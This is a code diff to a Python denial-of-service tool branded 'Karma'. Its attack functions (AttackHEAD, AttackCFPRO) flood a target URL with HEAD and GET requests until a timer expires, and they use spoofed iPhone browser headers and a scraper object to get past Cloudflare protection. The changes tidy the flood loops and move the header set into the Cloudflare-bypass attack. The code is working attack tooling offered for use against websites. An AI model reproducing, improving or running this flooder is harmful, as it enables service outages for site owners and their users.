@@ -10,22 +10,6 @@ from sys import stdout
 from colorama import Fore, init
 init(convert=True)
 
-headers = {
-        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-User': '?1',
-        'TE': 'trailers',
-}
-
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     while True:
@@ -39,6 +23,7 @@ def countdown(t):
 
 #region get
 def get_target(url):
+    url = url.rstrip()
     target = {}
     target['uri'] = urlparse(url).path
     if target['uri'] == "":
@@ -88,6 +73,7 @@ def get_cookie(url):
                 pass
         time.sleep(1)
     driver.quit()
+    return False
 
 def get_info():
     stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
@@ -114,9 +100,8 @@ def LaunchHEAD(url, th, t):
 def AttackHEAD(url, until_datetime):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            for i in range(50):
-                requests.head(url)
-                requests.head(url)
+            requests.head(url)
+            requests.head(url)
         except:
             pass
 #endregion
@@ -319,6 +304,21 @@ def LaunchCFPRO(url, th, t):
             pass
 
 def AttackCFPRO(url, until_datetime, scraper):
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'TE': 'trailers',
+    }
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             scraper.get(url=url, headers=headers, allow_redirects=False)
@@ -464,7 +464,6 @@ def title():
     stdout.write("\n")
 
 def command():
-    #stdout.write(Fore.LIGHTMAGENTA_EX+"┌───"+Fore.MAGENTA+"("+Fore.LIGHTGREEN_EX+"@"+Fore.RED+namee+Fore.MAGENTA+")"+Fore.LIGHTGREEN_EX+"-"+Fore.MAGENTA+"["+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"root"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"KarmaSH"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n└──> "+Fore.WHITE)
     stdout.write(Fore.LIGHTMAGENTA_EX+"╔═══"+Fore.MAGENTA+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.MAGENTA+"Karma"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
     command = input()
     if command == "cls":
